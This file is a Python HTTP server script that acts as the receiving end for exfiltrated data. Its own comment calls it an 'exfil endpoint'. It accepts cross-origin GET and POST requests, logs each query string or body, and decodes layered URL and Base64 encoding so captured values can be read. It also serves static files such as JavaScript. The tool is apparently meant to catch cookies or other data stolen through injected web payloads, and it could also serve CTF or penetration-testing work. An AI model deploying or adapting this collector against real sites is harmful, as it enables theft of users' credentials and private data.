import http.server
import socketserver
import urllib.parse
import base64
import os,sys,re

##
##

PORT = 80
MAX_DEPTH = 5  # max recursive decoding layers

# Helpers

def fix_padding(b64_string):
    missing = len(b64_string) % 4
    if missing:
        b64_string += '=' * (4 - missing)
    return b64_string


def try_base64_decode(s: str):
    try:
        decoded = base64.urlsafe_b64decode(fix_padding(s))
        return decoded.decode('utf-8', errors='replace')
    except Exception:
        return None


def recursive_decode(data: str):
    """
    Recursively decode URL-encoding and Base64 layers up to MAX_DEPTH.
    """
    layers = []
    current = data
    for depth in range(MAX_DEPTH):
        # Try URL decoding first
        url_decoded = urllib.parse.unquote(current)
        if url_decoded != current:
            layers.append(('url', url_decoded))
            current = url_decoded
            continue
        # Try Base64 decoding
        candidate = re.sub(r"\s+", "", current)
        if re.fullmatch(r'[A-Za-z0-9_\-]+=*', candidate):
            b64_decoded = try_base64_decode(candidate)
            if b64_decoded is not None:
                layers.append(('b64', b64_decoded))
                current = b64_decoded
                continue
        break
    return current, layers


class DecodeHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Redirect default logging to stdout
        sys.stdout.write("%s - - [%s] %s\n" % (
            self.client_address[0],
            self.log_date_time_string(),
            format % args
        ))
        sys.stdout.flush()

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def handle_data(self, raw_data: str):
        key, sep, val = raw_data.partition('=')
        if not sep:
            print(f"[!] Unrecognized format: {raw_data}")
            return
        val = urllib.parse.unquote(val)
        print(f"[+] Raw payload ({key}): {val}")
        final, layers = recursive_decode(val)
        for i, (lt, txt) in enumerate(layers, 1):
            print(f"    Layer {i} ({lt}): {txt}")
        print(f"[+] Final decoded: {final}\n")
        sys.stdout.flush()

    def do_POST(self):
        print(f"🔍 Received POST {self.path}")
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        print(f"    Body: {body}")
        self.handle_data(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

    def do_GET(self):
        # If requesting a static file (.js, .html, etc), serve it normally
        parsed = urllib.parse.urlsplit(self.path)
        filepath = parsed.path.lstrip('/')
        if filepath and os.path.isfile(filepath):
            return super().do_GET()

        # Otherwise handle as exfil endpoint
        print(f"🔍 Received GET {self.path}")
        if parsed.query:
            self.handle_data(parsed.query)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

    def do_HEAD(self):
        # Support HEAD for image pre-flight
        return self.do_GET()


if __name__ == '__main__':
    with socketserver.TCPServer(('0.0.0.0', PORT), DecodeHandler) as httpd:
        print(f"Decode server listening on port {PORT}")
        httpd.serve_forever()
